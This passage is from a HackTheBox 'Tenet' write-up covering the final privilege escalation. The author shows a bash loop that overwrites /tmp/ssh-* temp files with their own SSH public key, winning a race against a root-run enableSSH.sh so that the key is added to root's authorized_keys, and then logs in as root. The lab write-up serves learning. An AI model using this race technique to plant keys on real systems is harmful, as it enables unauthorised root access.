<span class="k">key</span><span class="o">=</span><span class="ss">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span><span class="w"></span>
<span class="n">addKey</span><span class="w"></span>
<span class="n">checkAdded</span><span class="w"></span>
</code></pre>
</div>
<p>
 Oh that is a pretty neat
 <s>
  but so unrealistic
 </s>
 bash script there. I immediately noticed that the key stored inside at
 <code>
  /tmp/ssh-XXXXXXXX
 </code>
 is then copied to
 <code>
  /root/.ssh/authorized_keys
 </code>
 , which was exactly what I wanted. Only thing was that I wouldn't know the name of temp file preemptively, but if I was quick I could chuck in my SSH public key instead of the one in
 <code>
  enableSSH.sh
 </code>
 .
</p>
<p>
 I decided to bust out my BashFU and try to get my SSH key in. I used the command
 <code>
  find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null
 </code>
 to list all of the temp ssh files and just piped my SSH key into them. Below is my exploit bash script that I wrote and uploaded to the box. I knew that it had executed successfully if when I ran
 <code>
  sudo enableSSH.sh
 </code>
 it returned back with "Error in adding $sshName to authorized_keys file!".
</p>
<div class="codehilite">
 <pre><span></span><code><span class="k">while</span><span class="w"> </span><span class="p">:;</span><span class="w"></span>
<span class="n">do</span><span class="w"></span>
<span class="w">    </span><span class="n">files</span><span class="o">=</span><span class="err">`</span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">"ssh-*"</span><span class="w"> </span><span class="o">-</span><span class="n">maxdepth</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span><span class="err">`</span><span class="w"></span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">$</span><span class="n">files</span><span class="w"></span>
<span class="w">    </span><span class="n">do</span><span class="w"></span>
<span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKUsFpNACl75KbSr4trd57XlBGm+x7FB8Jo0eWUuBITVLYu1UHpck+UcAclH4sWPRHUlUMB9zzi4mvX0PEniWb14rC49M0om8I+/7vhtSUiOJ/DC/U/Cb8t05Y5nOkmwAAhb0mlyXFq3OprFKRKCzPMNY2OChdLndyw+V8y53OsVEjzUuFNOo+2J/B8kYLxW+MRKWxEugjpY7CZF9m6fqAFo0caSjYh9454/2OaItCOqwQD06dedPQQbp7yZRv4y//ST6NjX96S3xlPX6oZU4mkJxmgn4S+ufcczSvDT6HEfHDgF1+7GoZn3szQvLH5CCV3GH0a8aC9NLWrPXCVgeUxQMlEBV4kSyPaTeuiW66mDu5+4+nQ3XYjKm/jLDQzs5+IKpbYn/5NpKoRmktP4kAcmMFoFrUVZC9d1lQDmTKcF3ZJVG6KgW68+Xwj+RmIdiLSufeXdkbudInYeTBXCeLEO1nAetQj1kaPp7DFN6+tLPmg+C9UDqNfnl8cCzB3c= ghost@yourshell"</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"Dumped Payload Into $p"</span><span class="w"></span>
<span class="w">    </span><span class="n">done</span><span class="w"></span>
<span class="n">done</span><span class="w"></span>
</code></pre>
</div>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/letsgetroot.png"/>
</p>
<p>
 <strong>
  nnnnoooooooOOOOOooooooooooiiiiccceeee
 </strong>
</p>
<p>
 All that was left to do was SSH in.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/aywegotroot.png"/>
</p>
<p>
 <strong>
  nnnnooooooo000000000OOOOOOOOOO000000000ooooooooooiiiiccceeee
 </strong>
</p>
</div>
</div>
</section>
<section class="wrapper style3 ">
<div class="inner">
<div class="content">

<h1 class="major" id="conclusion">
 Conclusion
</h1>
<p>
 Yeah this was a definitely a fun, quick, nice box. Although it was (once again) more like playing a CTF than something realistic, it was still an enjoyable and educational experience. I knew about PHP deserialization attacks beforehand from watching YouTube videos on the topic
 <s>
  (Papa Bless you IppSec)
 </s>
 , but I never done one in HackTheBox before.
</p>
<p>
 Cheers for the sweet box egotisticalSW!
</p></div>
</div>
</section>
</section>

    	</div>

    <!-- Footer -->
      <!-- Footer -->
  <section id="footer">
    <div class="inner">
      <ul class="icons">
        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
      </ul>
    </div>
  </section>

		<!-- Particles -->
			<div id="particles-js"></div>

		<!-- Scripts -->
			<script src="/assets/js/jquery.min.js"></script>
			<script src="/assets/js/jquery.scrollex.min.js"></script>
			<script src="/assets/js/browser.min.js"></script>
			<script src="/assets/js/breakpoints.min.js"></script>
			<script src="/assets/js/util.js"></script>
			<script src="/assets/js/particles.min.js"></script>
			<script src="/assets/js/main.js"></script>
      
	</body>
</html>